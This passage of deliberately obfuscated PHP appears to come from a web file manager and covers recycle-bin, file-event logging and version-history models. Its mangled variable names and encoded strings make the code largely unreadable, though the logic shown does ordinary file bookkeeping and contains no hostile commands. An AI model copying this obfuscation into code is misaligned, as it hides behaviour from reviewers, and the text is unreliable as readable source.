$ÑÉå¹ù = array(); $ÑÉå¹ù[$ïì”Ş©Ë[2154]] = array($ïì”Ş©Ë[2155] => LNG($ïì”Ş©Ë[2154]), $ïì”Ş©Ë[2156] => $this->where($€¹­¡ş†)->count(), $ïì”Ş©Ë[594] => $this->where($€¹­¡ş†)->sum($ïì”Ş©Ë[86])); $ñ˜€ššÒ = KodIO::fileTypeList(); foreach ($ñ˜€ššÒ as $÷¬Ùì† => $µ½ûóó) { $€¹­¡ş†[$ïì”Ş©Ë[421]] = $this->fileTypeWhere($÷¬Ùì†); $ÑÉå¹ù[$÷¬Ùì†] = array($ïì”Ş©Ë[2155] => $µ½ûóó[$ïì”Ş©Ë[42]], $ïì”Ş©Ë[2156] => $this->where($€¹­¡ş†)->count(), $ïì”Ş©Ë[594] => $this->where($€¹­¡ş†)->sum($ïì”Ş©Ë[86])); } Cache::set($®¥¯ÇÊ‰, $ÑÉå¹ù, 1200); return $ÑÉå¹ù; } public function fileNameExist($ŠÃ†¿Ñ¨, $Š¼ Ø˜³) { $œ¬”Œô» =& $_SERVER[¹Û¹Æ€]; $ë §â¨ = $this->where(array($œ¬”Œô»[441] => $ŠÃ†¿Ñ¨, $œ¬”Œô»[42] => $Š¼ Ø˜³, $œ¬”Œô»[440] => 0))->find(); return is_array($ë §â¨) ? $ë §â¨[$œ¬”Œô»[411]] : !1; } public function childList($™ƒ´ÊÈ¦) { $ùşóØœ =& $_SERVER[¹Û¹Æ€]; $ú×ÄüúÉ = $ùşóØœ[2131] . $™ƒ´ÊÈ¦; if (isset(self::$cacheChildList[$ú×ÄüúÉ])) { return self::$cacheChildList[$ú×ÄüúÉ]; } $é‡Èùë‚ = array($ùşóØœ[441] => intval($™ƒ´ÊÈ¦), $ùşóØœ[440] => 0); $•¥ÜößÚ = $this->where($é‡Èùë‚)->select(); $•¥ÜößÚ = $•¥ÜößÚ ? $•¥ÜößÚ : array(); self::$cacheChildList[$ú×ÄüúÉ] = $•¥ÜößÚ; foreach ($•¥ÜößÚ as $ğò ·éò) { $ú×ÄüúÉ = $ùşóØœ[469] . $ğò ·éò[$ùşóØœ[411]]; self::$cacheSourceInfo[$ú×ÄüúÉ] = $ğò ·éò; } return $•¥ÜößÚ; } public function fileNameAuto($ÍıĞı, $Ï¨”Üê¯, $ãóÙ—İ = REPEAT_RENAME, $Æşğş ² = false) { $Õ­Ö³Ù’ =& $_SERVER[¹Û¹Æ€]; $˜­ŸøÆ = get_path_ext($Ï¨”Üê¯); $ÏõûŸ‘´ = $˜­ŸøÆ ? basename($Ï¨”Üê¯, $Õ­Ö³Ù’[20] . $˜­ŸøÆ) . $Õ­Ö³Ù’[2157] . $˜­ŸøÆ : $Ï¨”Üê¯ . $Õ­Ö³Ù’[393]; $Ÿşç±™³ = array($Õ­Ö³Ù’[441] => $ÍıĞı, $Õ­Ö³Ù’[440] => 0, $Õ­Ö³Ù’[42] => array($Õ­Ö³Ù’[392], $ÏõûŸ‘´)); $¦ßÁĞÌ” = $this->field($Õ­Ö³Ù’[42])->where($Ÿşç±™³)->select(); $Å–¨ÇÔÍ = array_to_keyvalue($¦ßÁĞÌ”, $Õ­Ö³Ù’[22], $Õ­Ö³Ù’[42]); return $this->fileNameAutoGet($Å–¨ÇÔÍ, $Ï¨”Üê¯, $ãóÙ—İ, $Æşğş ²); } public function fileNameAutoGet($ßİÔĞÖÄ, $Ì‹¾Ãè, $çÛ­ˆÒ¢, $˜˜ÜÜ“) { $Ï’§«è€ =& $_SERVER[¹Û¹Æ€]; if ($çÛ­ˆÒ¢ == REPEAT_REPLACE || !$ßİÔĞÖÄ || !in_array_not_case($Ì‹¾Ãè, $ßİÔĞÖÄ) || $˜˜ÜÜ“ && $çÛ­ˆÒ¢ != REPEAT_RENAME_FOLDER) { return $Ì‹¾Ãè; } if ($çÛ­ˆÒ¢ == REPEAT_SKIP) { return !1; } $„ˆ€®– = $Ï’§«è€[20] . get_path_ext($Ì‹¾Ãè); $„ˆ€®– = $„ˆ€®– == $Ï’§«è€[20] || $˜˜ÜÜ“ ? $Ï’§«è€[22] : $„ˆ€®–; for ($¦õˆ“€ã = 1; $¦õˆ“€ã <= count($ßİÔĞÖÄ) + 1; $¦õˆ“€ã++) { $ğâ—Ğ÷ = substr($Ì‹¾Ãè, 0, strlen($Ì‹¾Ãè) - strlen($„ˆ€®–)); $ä¿Í¶áú = $ğâ—Ğ÷ . "\x28{$¦õˆ“€ã}\51{$„ˆ€®–}"; if (!in_array_not_case($ä¿Í¶áú, $ßİÔĞÖÄ)) { return $ä¿Í¶áú; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\x63\145\x5f\162\x65\143\171\143\154\x65"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\143\164\151\157\x6e")); public function listData($¥§Ù€·¦ = false) { $åú ‰—ã =& $_SERVER[¹Û¹Æ€]; $¥§Ù€·¦ = $¥§Ù€·¦ ? $¥§Ù€·¦ : USER_ID; $†áõ Å = $this->where(array($åú ‰—ã[1650] => $¥§Ù€·¦))->select(); return array_to_keyvalue($†áõ Å, $åú ‰—ã[22], $åú ‰—ã[411]); } public function moveToRecycle($¼ÈŠÄÒÏ) { $Äµëüî™ =& $_SERVER[¹Û¹Æ€]; $‚Å°›°‹ = Model($Äµëüî™[1333]); $—²Åª¼Ç = $‚Å°›°‹->sourceInfo($¼ÈŠÄÒÏ); if (!$—²Åª¼Ç || $—²Åª¼Ç[$Äµëüî™[440]] == $Äµëüî™[98]) { return; } $ü³¦ó¸ = array($Äµëüî™[426] => $¼ÈŠÄÒÏ, $Äµëüî™[1650] => USER_ID, $Äµëüî™[595] => $—²Åª¼Ç[$Äµëüî™[420]], $Äµëüî™[596] => $—²Åª¼Ç[$Äµëüî™[514]], $Äµëüî™[599] => $—²Åª¼Ç[$Äµëüî™[530]]); $this->add($ü³¦ó¸); $this->recycleMove($¼ÈŠÄÒÏ, 1); if ($—²Åª¼Ç[$Äµëüî™[419]] == $Äµëüî™[98]) { $ª¸âûÙï = array($Äµëüî™[599] => array($Äµëüî™[559], $—²Åª¼Ç[$Äµëüî™[530]] . $¼ÈŠÄÒÏ . $Äµëüî™[560])); $‚Å°›°‹->where($ª¸âûÙï)->setField($Äµëüî™[440], 1); } } public function clear() { $this->remove(!1); } public function remove($ÈÍ·»ÀÁ = false, $¨€ÊÄ÷© = false) { $Óœ’¯–ª =& $_SERVER[¹Û¹Æ€]; $¨€ÊÄ÷© = $¨€ÊÄ÷© ? $¨€ÊÄ÷© : USER_ID; $–Êàéú = Model($Óœ’¯–ª[1333]); $•²¡ñÁÚ = $this->listData($¨€ÊÄ÷©); $ÈÍ·»ÀÁ = $ÈÍ·»ÀÁ === !1 ? !1 : $ÈÍ·»ÀÁ; $¯î¤ŞˆÇ = array(); foreach ($•²¡ñÁÚ as $Éß­÷ê“) { if ($ÈÍ·»ÀÁ != !1 && !in_array($Éß­÷ê“, $ÈÍ·»ÀÁ)) { continue; } $­Á¿’Ğ = $–Êàéú->sourceInfo($Éß­÷ê“); $–Êàéú->remove($Éß­÷ê“, !1); $±İı¬®ë = $­Á¿’Ğ[$Óœ’¯–ª[420]] . $Óœ’¯–ª[21] . $­Á¿’Ğ[$Óœ’¯–ª[514]]; $¯î¤ŞˆÇ[$±İı¬®ë] = array($Óœ’¯–ª[595] => $­Á¿’Ğ[$Óœ’¯–ª[420]], $Óœ’¯–ª[514] => $­Á¿’Ğ[$Óœ’¯–ª[514]]); $this->where(array($Óœ’¯–ª[411] => $Éß­÷ê“))->delete(); } foreach ($¯î¤ŞˆÇ as $‘‘ø…Şİ) { $–Êàéú->targetSpaceUpdate($‘‘ø…Şİ[$Óœ’¯–ª[420]], $‘‘ø…Şİ[$Óœ’¯–ª[514]]); } } public function restore($¿¥ø‚ÎÎ = false) { $¼ÚºÄ¡Ş = $this->listData(); $this->_restoreSource($¼ÚºÄ¡Ş, $¿¥ø‚ÎÎ); } public function removeUserAll($¾Ó”®ÙÏ) { $this->remove(!1, $¾Ó”®ÙÏ); } private function _restoreSource($Åïª¢ª÷, $¾ë×Ã›) { $ÊöÙÔÌ =& $_SERVER[¹Û¹Æ€]; $æ¨ÊËïü = Model($ÊöÙÔÌ[1333]); $¾ë×Ã› = $¾ë×Ã› == !1 ? !1 : $¾ë×Ã›; if (!$Åïª¢ª÷) { return !0; } $Öºğ¾ø— = array(); foreach ($Åïª¢ª÷ as $µĞÊ¤…Æ) { if ($¾ë×Ã› != !1 && !in_array($µĞÊ¤…Æ, $¾ë×Ã›)) { continue; } $…ŠÄşà = $æ¨ÊËïü->sourceInfo($µĞÊ¤…Æ); $’·Í‡ Œ = $æ¨ÊËïü->sourceInfo($…ŠÄşà[$ÊöÙÔÌ[441]]); if ($’·Í‡ Œ[$ÊöÙÔÌ[440]] == $ÊöÙÔÌ[98]) { continue; } $æ¨ÊËïü->lockMoveStart($µĞÊ¤…Æ); $this->recycleMove($µĞÊ¤…Æ, 0); if ($…ŠÄşà[$ÊöÙÔÌ[419]] == $ÊöÙÔÌ[98]) { $Ó‘ÛÕÓÔ = array($ÊöÙÔÌ[599] => array($ÊöÙÔÌ[559], $…ŠÄşà[$ÊöÙÔÌ[530]] . $µĞÊ¤…Æ . $ÊöÙÔÌ[560])); $æ¨ÊËïü->where($Ó‘ÛÕÓÔ)->setField($ÊöÙÔÌ[440], 0); $this->restoreFolderChildren($µĞÊ¤…Æ, $Åïª¢ª÷); } $this->where(array($ÊöÙÔÌ[411] => $µĞÊ¤…Æ))->delete(); $æ¨ÊËïü->folderSizeReset($…ŠÄşà[$ÊöÙÔÌ[441]]); $Öºğ¾ø—[] = $…ŠÄşà[$ÊöÙÔÌ[441]]; if ($…ŠÄşà[$ÊöÙÔÌ[419]] == $ÊöÙÔÌ[98]) { $Öºğ¾ø—[] = $µĞÊ¤…Æ; } $æ¨ÊËïü->lockMoveEnd($µĞÊ¤…Æ); } $æ¨ÊËïü->updateModifyTime($Öºğ¾ø—); } private function restoreFolderChildren($Æâ‹ã¾ú, $ü”ï™š) { $ùê­±Æ =& $_SERVER[¹Û¹Æ€]; $à‚×°ÑÊ = Model($ùê­±Æ[1333]); $­Â™§â = array($ùê­±Æ[411] => array($ùê­±Æ[17], array())); foreach ($ü”ï™š as $½ö’×ìœ) { if ($½ö’×ìœ == $Æâ‹ã¾ú) { continue; } if (!$à‚×°ÑÊ->isParentOf($Æâ‹ã¾ú, $½ö’×ìœ)) { continue; } $“æàÚ„‘ = $à‚×°ÑÊ->sourceInfo($½ö’×ìœ); if ($“æàÚ„‘[$ùê­±Æ[419]] == $ùê­±Æ[98]) { $­Â™§â[] = array($ùê­±Æ[599] => array($ùê­±Æ[559], $“æàÚ„‘[$ùê­±Æ[530]] . $½ö’×ìœ . $ùê­±Æ[560])); } else { $­Â™§â[$ùê­±Æ[411]][1][] = $½ö’×ìœ; } } if (!$­Â™§â[$ùê­±Æ[411]][1]) { unset($­Â™§â[$ùê­±Æ[411]]); } if (!$­Â™§â) { return; } $­Â™§â[$ùê­±Æ[411]][1] = array_unique($­Â™§â[$ùê­±Æ[411]][1]); $­Â™§â[$ùê­±Æ[997]] = $ùê­±Æ[1947]; $à‚×°ÑÊ->where($­Â™§â)->setField($ùê­±Æ[440], 1); } private function recycleMove($ œğ×¸, $İôÛŞÀÉ = 1) { $İşÚ›øâ =& $_SERVER[¹Û¹Æ€]; $üõ×¦ºà = Model($İşÚ›øâ[1333]); $Éî¡ò ” = Model($İşÚ›øâ[2158]); $ë——‰†Æ = array($İşÚ›øâ[411] => $ œğ×¸); if ($İôÛŞÀÉ) { $üõ×¦ºà->where($ë——‰†Æ)->setField($İşÚ›øâ[440], 1); $Éî¡ò ”->eventRecycle($ œğ×¸, $İşÚ›øâ[2159]); } else { $Õˆø‡ù½ = $üõ×¦ºà->where($ë——‰†Æ)->find(); $£äº€À = $Õˆø‡ù½[$İşÚ›øâ[419]] == $İşÚ›øâ[98]; $ĞßÙßàİ = $üõ×¦ºà->fileNameAuto($Õˆø‡ù½[$İşÚ›øâ[441]], $Õˆø‡ù½[$İşÚ›øâ[42]], REPEAT_RENAME_FOLDER, $£äº€À); if ($ĞßÙßàİ != $Õˆø‡ù½[$İşÚ›øâ[42]]) { $üõ×¦ºà->rename($ œğ×¸, $ĞßÙßàİ); } $üõ×¦ºà->where($ë——‰†Æ)->setField($İşÚ›øâ[440], 0); $Éî¡ò ”->eventRecycle($ œğ×¸, $İşÚ›øâ[2160]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\163\157\x75\x72\143\x65\x53\x65\143\x72\x65\164\114\151\x73\x74"; public $field = array("\163\x6f\x75\x72\143\145\111\x44", "\164\171\x70\x65\x49\x44", "\143\x72\x65\141\x74\145\125\x73\145\162"); } goto bê°¢ºí…°; C…ÂÈÒêÇ¥: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\156\x63\x74\151\x6f\156"), array("\144\x65\x73\x63", '', "\x69\156\x73\145\162\x74\54\x75\x70\x64\x61\x74\x65\x2c\x73\145\154\145\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($çüŠü›Ô, $Ìµ­¹ƒï, $†äôàØÀ = '') { $úÏü”Éå =& $_SERVER[¹Û¹Æ€]; if (!$this->eventSave) { return; } $³ñå÷Å = Model($úÏü”Éå[1333])->sourceInfo($çüŠü›Ô); if (!$³ñå÷Å) { return !1; } if ($this->isCacheEvent($³ñå÷Å, $Ìµ­¹ƒï)) { return; } if ($†äôàØÀ && is_string($†äôàØÀ)) { $†äôàØÀ = array($úÏü”Éå[1888] => $†äôàØÀ); } $¬ÙÉºÑ = array($úÏü”Éå[426] => $çüŠü›Ô, $úÏü”Éå[2066] => $³ñå÷Å[$úÏü”Éå[441]], $úÏü”Éå[2067] => $³ñå÷Å[$úÏü”Éå[42]], $úÏü”Éå[528] => !empty($³ñå÷Å[$úÏü”Éå[528]]) ? $³ñå÷Å[$úÏü”Éå[528]] : $úÏü”Éå[22], $úÏü”Éå[1650] => USER_ID, $úÏü”Éå[431] => $Ìµ­¹ƒï, $úÏü”Éå[1652] => $†äôàØÀ); $this->addSystemLog($Ìµ­¹ƒï, $¬ÙÉºÑ); unset($¬ÙÉºÑ[$úÏü”Éå[2067]], $¬ÙÉºÑ[$úÏü”Éå[528]]); return $this->add($¬ÙÉºÑ); } private function addSystemLog($Êì‘ÃÍæ, $—ÆàâŞæ) { $Ô¤û£š =& $_SERVER[¹Û¹Æ€]; if ($Êì‘ÃÍæ == $Ô¤û£š[2068]) { $Êì‘ÃÍæ = $—ÆàâŞæ[$Ô¤û£š[462]][$Ô¤û£š[2069]]; } else { if (in_array($Êì‘ÃÍæ, array($Ô¤û£š[1829], $Ô¤û£š[2070]))) { $Êì‘ÃÍæ = $—ÆàâŞæ[$Ô¤û£š[462]][$Ô¤û£š[753]]; } } $ªã’ä´è = array_merge($—ÆàâŞæ, array($Ô¤û£š[2071] => $—ÆàâŞæ[$Ô¤û£š[411]], $Ô¤û£š[2072] => $—ÆàâŞæ[$Ô¤û£š[2072]])); Hook::trigger($Ô¤û£š[2073], $Ô¤û£š[2074] . $Êì‘ÃÍæ, $—ÆàâŞæ); Model($Ô¤û£š[1793])->addLog($Ô¤û£š[2074] . $Êì‘ÃÍæ, $ªã’ä´è); } private function isCacheEvent($°í²´“¤, $Êà†ë¾) { if ($°í²´“¤[$_SERVER[¹Û¹Æ€][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¬¾Ğ¤Œ, $ßïş©–¶) { $¶—Üİµ» =& $_SERVER[¹Û¹Æ€]; $««°ûâ¶ = Model($¶—Üİµ»[1333])->sourceInfo($¬¾Ğ¤Œ); $ºÚÄàêõ = array($¶—Üİµ»[2069] => $ßïş©–¶, $¶—Üİµ»[42] => $««°ûâ¶[$¶—Üİµ»[42]]); return $this->addEvent($¬¾Ğ¤Œ, $¶—Üİµ»[2068], $ºÚÄàêõ); } public function eventFileEdit($ŸƒŠØøÜ) { $€Á¢øıÔ =& $_SERVER[¹Û¹Æ€]; $ÌÁ¨‰Ÿ = array($€Á¢øıÔ[2075] => $_SERVER[$€Á¢øıÔ[2076]], $€Á¢øıÔ[2077] => strtolower(ACTION)); if (isset($GLOBALS[$€Á¢øıÔ[17]][$€Á¢øıÔ[2078]])) { $ÌÁ¨‰Ÿ[$€Á¢øıÔ[2078]] = $€Á¢øıÔ[98]; } return $this->addEvent($ŸƒŠØøÜ, $€Á¢øıÔ[1819], $ÌÁ¨‰Ÿ); } public function eventRecycle($ÜèÀõµ¢, $Ã“˜ÂŸè) { return $this->addEvent($ÜèÀõµ¢, $_SERVER[¹Û¹Æ€][2070], $Ã“˜ÂŸè); } public function eventRemove($òóâíò) { $²ËËĞ­˜ =& $_SERVER[¹Û¹Æ€]; $Ş˜†ıÀÈ = Model($²ËËĞ­˜[1333])->sourceInfo($òóâíò); $Å¢±ä”¤ = $Ş˜†ıÀÈ[$²ËËĞ­˜[42]]; return $this->addEvent($Ş˜†ıÀÈ[$²ËËĞ­˜[441]], $²ËËĞ­˜[1818], $Å¢±ä”¤); } public function eventShare($¨ïÙŠ€Î, $ÅÚÌ¸Éõ) { return $this->addEvent($¨ïÙŠ€Î, $_SERVER[¹Û¹Æ€][1829], $ÅÚÌ¸Éõ); } public function eventMove($õØÏ Û€, $èÖÎä ®, $Ÿ÷ÍŠ‡®) { $âùšƒ =& $_SERVER[¹Û¹Æ€]; $ü˜±´™ = Model($âùšƒ[1333]); $îÉêÉ° = $ü˜±´™->sourceInfo($õØÏ Û€); $ØÔÂçùŸ = $ü˜±´™->sourceInfo($èÖÎä ®); $…ã°âş· = $ü˜±´™->sourceInfo($Ÿ÷ÍŠ‡®); $ÁŸŒÌÌƒ = array($âùšƒ[1157] => $èÖÎä ®, $âùšƒ[2079] => $ØÔÂçùŸ[$âùšƒ[42]], $âùšƒ[2057] => !empty($ØÔÂçùŸ[$âùšƒ[528]]) ? $ØÔÂçùŸ[$âùšƒ[528]] : $âùšƒ[22], $âùšƒ[1158] => $Ÿ÷ÍŠ‡®, $âùšƒ[2080] => $…ã°âş·[$âùšƒ[42]], $âùšƒ[2081] => !empty($…ã°âş·[$âùšƒ[528]]) ? $…ã°âş·[$âùšƒ[528]] : $âùšƒ[22]); $this->addEvent($õØÏ Û€, $âùšƒ[566], $ÁŸŒÌÌƒ); $îÉêÉ° = $ü˜±´™->sourceInfo($õØÏ Û€); $ÁŸŒÌÌƒ = array($âùšƒ[411] => $îÉêÉ°[$âùšƒ[411]], $âùšƒ[42] => $îÉêÉ°[$âùšƒ[42]]); $this->addEvent($èÖÎä ®, $âùšƒ[2082], $ÁŸŒÌÌƒ); } public function eventCopy($¦µìœ‘Á) { $this->eventCreate($¦µìœ‘Á, $_SERVER[¹Û¹Æ€][564]); } public function eventRename($×ºúˆ¬™, $¹Î¥ğª, $ °ûä•À) { $ŸÕÏ±îú =& $_SERVER[¹Û¹Æ€]; $¢âèò“© = array($ŸÕÏ±îú[1157] => $¹Î¥ğª, $ŸÕÏ±îú[1158] => $ °ûä•À); return $this->addEvent($×ºúˆ¬™, $ŸÕÏ±îú[1348], $¢âèò“©); } public function eventAddComment($›ÑÍà©–, $®ïïÏó‘) { return $this->addEvent($›ÑÍà©–, $_SERVER[¹Û¹Æ€][2083], $®ïïÏó‘); } public function eventAddDesc($ß¼æ¨şÌ, $”¨ºÇÍĞ) { return $this->addEvent($ß¼æ¨şÌ, $_SERVER[¹Û¹Æ€][2084], $”¨ºÇÍĞ); } public function listBySource($ûÜùÔÒ) { $üÕ´®•˜ =& $_SERVER[¹Û¹Æ€]; $ˆİËê±‡ = Model($üÕ´®•˜[1333])->sourceInfo($ûÜùÔÒ); $ß‹™ıÎ = array($üÕ´®•˜[426] => $ûÜùÔÒ); if ($ˆİËê±‡[$üÕ´®•˜[419]] == $üÕ´®•˜[98]) { $ğë¯§íä = Model($üÕ´®•˜[1333])->listSearchChildren($ûÜùÔÒ, 20000); $ğë¯§íä[] = $ûÜùÔÒ . $üÕ´®•˜[387]; $ß‹™ıÎ = array($üÕ´®•˜[411] => array($üÕ´®•˜[17], $ğë¯§íä)); } $È‘ò½–Ø = $this->where($ß‹™ıÎ)->order($üÕ´®•˜[2085])->selectPage(); if ($È‘ò½–Ø[$üÕ´®•˜[375]][$üÕ´®•˜[376]] == 0) { $È‘ò½–Ø[$üÕ´®•˜[375]][$üÕ´®•˜[376]] = 1; $È‘ò½–Ø[$üÕ´®•˜[378]] = array(array($üÕ´®•˜[426] => $ûÜùÔÒ, $üÕ´®•˜[2066] => $ˆİËê±‡[$üÕ´®•˜[441]], $üÕ´®•˜[1650] => $ˆİËê±‡[$üÕ´®•˜[463]], $üÕ´®•˜[431] => $üÕ´®•˜[2086], $üÕ´®•˜[432] => $ˆİËê±‡[$üÕ´®•˜[210]], $üÕ´®•˜[1652] => $üÕ´®•˜[22])); } return $this->eventListParse($È‘ò½–Ø, $ûÜùÔÒ); } private function eventListParse($íÂ©”Ã·, $öİçˆºÀ) { $‰‘×ŞóŠ =& $_SERVER[¹Û¹Æ€]; $ÀÄ€˜®¾ = $íÂ©”Ã·[$‰‘×ŞóŠ[378]]; $¶Õ–ªõ = array_to_keyvalue($ÀÄ€˜®¾, $‰‘×ŞóŠ[22], $‰‘×ŞóŠ[411]); $¤ßÕÏº = array_to_keyvalue($ÀÄ€˜®¾, $‰‘×ŞóŠ[22], $‰‘×ŞóŠ[2072]); foreach ($ÀÄ€˜®¾ as $Ë¾Ë´˜) { $è¶ç´¢ = $Ë¾Ë´˜[$‰‘×ŞóŠ[462]]; if ($Ë¾Ë´˜[$‰‘×ŞóŠ[43]] == $‰‘×ŞóŠ[566] && isset($è¶ç´¢[$‰‘×ŞóŠ[1157]])) { $¶Õ–ªõ[] = $è¶ç´¢[$‰‘×ŞóŠ[1157]] . $‰‘×ŞóŠ[22]; $¶Õ–ªõ[] = $è¶ç´¢[$‰‘×ŞóŠ[1158]] . $‰‘×ŞóŠ[22]; } if ($Ë¾Ë´˜[$‰‘×ŞóŠ[43]] == $‰‘×ŞóŠ[2082] && isset($è¶ç´¢[$‰‘×ŞóŠ[411]])) { $¶Õ–ªõ[] = $è¶ç´¢[$‰‘×ŞóŠ[411]] . $‰‘×ŞóŠ[22]; } } $¶Õ–ªõ = array_merge($¶Õ–ªõ, $¤ßÕÏº, array($öİçˆºÀ . $‰‘×ŞóŠ[22])); $¶Õ–ªõ = array_unique($¶Õ–ªõ); $ç×Ã¾Ïˆ = array_unique(array_to_keyvalue($ÀÄ€˜®¾, $‰‘×ŞóŠ[22], $‰‘×ŞóŠ[1659])); $®¢ßòòß = Model($‰‘×ŞóŠ[544])->userListInfo($ç×Ã¾Ïˆ); $ê§º­†È = Model($‰‘×ŞóŠ[823])->sourceListInfo($¶Õ–ªõ, !0); foreach ($ÀÄ€˜®¾ as &$Ë¾Ë´˜) { if ($Ë¾Ë´˜[$‰‘×ŞóŠ[43]] == $‰‘×ŞóŠ[566] && isset($Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[1157]])) { $Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[1157]] = $ê§º­†È[$Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[1157]]]; $Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[1158]] = $ê§º­†È[$Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[1158]]]; } if ($Ë¾Ë´˜[$‰‘×ŞóŠ[43]] == $‰‘×ŞóŠ[2082] && isset($Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[411]])) { $Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[411]] = $ê§º­†È[$Ë¾Ë´˜[$‰‘×ŞóŠ[462]][$‰‘×ŞóŠ[411]]]; } $Ë¾Ë´˜[$‰‘×ŞóŠ[96]] = $ê§º­†È[$Ë¾Ë´˜[$‰‘×ŞóŠ[411]]]; $Ë¾Ë´˜[$‰‘×ŞóŠ[2087]] = $ê§º­†È[$Ë¾Ë´˜[$‰‘×ŞóŠ[2072]]]; if ($Ë¾Ë´˜[$‰‘×ŞóŠ[43]] == $‰‘×ŞóŠ[1818]) { $Ë¾Ë´˜[$‰‘×ŞóŠ[2087]] = $Ë¾Ë´˜[$‰‘×ŞóŠ[96]]; $Ë¾Ë´˜[$‰‘×ŞóŠ[2072]] = $Ë¾Ë´˜[$‰‘×ŞóŠ[2087]][$‰‘×ŞóŠ[411]]; $Ë¾Ë´˜[$‰‘×ŞóŠ[96]] = !1; $Ë¾Ë´˜[$‰‘×ŞóŠ[411]] = $‰‘×ŞóŠ[22]; } $Ë¾Ë´˜[$‰‘×ŞóŠ[2017]] = $®¢ßòòß[$Ë¾Ë´˜[$‰‘×ŞóŠ[1659]]]; } unset($Ë¾Ë´˜); $íÂ©”Ã·[$‰‘×ŞóŠ[378]] = $ÀÄ€˜®¾; return $íÂ©”Ã·; } public function removeBySource($àİ±§) { $û˜Á…ˆØ = array($_SERVER[¹Û¹Æ€][426] => $àİ±§); $this->where($û˜Á…ˆØ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\145\137\x68\x69\x73\x74\157\162\x79"; public function historyCount($ò°ˆ³ÙÁ) { $ÑÒˆ¸œ =& $_SERVER[¹Û¹Æ€]; if (!$ò°ˆ³ÙÁ) { return array(); } if (is_string($ò°ˆ³ÙÁ) || is_int($ò°ˆ³ÙÁ)) { $ò°ˆ³ÙÁ = array($ò°ˆ³ÙÁ); } $•»Ú“®Ü = array($ÑÒˆ¸œ[411], $ÑÒˆ¸œ[1882] => $ÑÒˆ¸œ[509]); $ñøª™» = array($ÑÒˆ¸œ[411] => array($ÑÒˆ¸œ[17], $ò°ˆ³ÙÁ)); $ªÕšÚ°Ï = $this->field($•»Ú“®Ü)->where($ñøª™»)->group($ÑÒˆ¸œ[411])->select(); return array_to_keyvalue($ªÕšÚ°Ï, $ÑÒˆ¸œ[411], $ÑÒˆ¸œ[509]); } public function addHistory($Ûß¸œÈŠ, $…ªÒí•‚ = '') { $¯ĞÇæìì =& $_SERVER[¹Û¹Æ€]; $Èá¦÷ÕÜ = array($¯ĞÇæìì[426] => $Ûß¸œÈŠ[$¯ĞÇæìì[411]], $¯ĞÇæìì[1650] => isset($Ûß¸œÈŠ[$¯ĞÇæìì[465]]) ? $Ûß¸œÈŠ[$¯ĞÇæìì[465]] : $Ûß¸œÈŠ[$¯ĞÇæìì[463]], $¯ĞÇæìì[478] => $Ûß¸œÈŠ[$¯ĞÇæìì[477]], $¯ĞÇæìì[594] => $Ûß¸œÈŠ[$¯ĞÇæìì[86]], $¯ĞÇæìì[2088] => $…ªÒí•‚); if ($GLOBALS[$¯ĞÇæìì[16]][$¯ĞÇæìì[99]][$¯ĞÇæìì[1215]] >= 1) { $this->historyAutoClear($Èá¦÷ÕÜ[$¯ĞÇæìì[411]]); $this->add($Èá¦÷ÕÜ); } Hook::trigger($¯ĞÇæìì[2089], $Èá¦÷ÕÜ); Model($¯ĞÇæìì[2090])->eventFileEdit($Ûß¸œÈŠ[$¯ĞÇæìì[411]]); } private function historyAutoClear($¦°Åñ‘Ó) { $ó…ö•øá =& $_SERVER[¹Û¹Æ€]; $ ­í‹´ = Model($ó…ö•øá[768])->get($ó…ö•øá[1237]); $…ôŸ†ç = $GLOBALS[$ó…ö•øá[16]][$ó…ö•øá[99]][$ó…ö•øá[1215]]; $§²üñÓ = $ ­í‹´ == $ó…ö•øá[1238] ? min(5, $…ôŸ†ç) : $…ôŸ†ç; $§²üñÓ = $§²üñÓ <= 0 ? 0 : $§²üñÓ - 1; if ($§²üñÓ >= 500) { return; } $˜£Á€©” = array($ó…ö•øá[426] => $¦°Åñ‘Ó); $º¹µ³ï– = $this->field($ó…ö•øá[2091])->where($˜£Á€©”)->order($ó…ö•øá[2085])->select(); if (!$º¹µ³ï– || $§²üñÓ >= count($º¹µ³ï–)) { return; } $ãÚ×¯öÁ = array_to_keyvalue($º¹µ³ï–, $ó…ö•øá[22], $ó…ö•øá[408]); $ãÚ×¯öÁ = array_slice($ãÚ×¯öÁ, $§²üñÓ); $Œ£çŸ”ª = array_to_keyvalue($º¹µ³ï–, $ó…ö•øá[22], $ó…ö•øá[477]); $Œ£çŸ”ª = array_slice($Œ£çŸ”ª, $§²üñÓ); if (!$ãÚ×¯öÁ || !$Œ£çŸ”ª) { return; } $˜£Á€©” = array($ó…ö•øá[428] => array($ó…ö•øá[17], $ãÚ×¯öÁ)); $this->where($˜£Á€©”)->delete(); Model($ó…ö•øá[480])->remove($Œ£çŸ”ª); } public function listData($†æ¬ÊƒØ) { $³î¹ë›¸ =& $_SERVER[¹Û¹Æ€]; $éü‘¼‘Ô = array($³î¹ë›¸[426] => $†æ¬ÊƒØ); $×ï‘”ÛÍ = $³î¹ë›¸[2092]; $Ñ×èˆÊ = $this->field($×ï‘”ÛÍ)->where($éü‘¼‘Ô)->order($³î¹ë›¸[2085])->selectPage(); 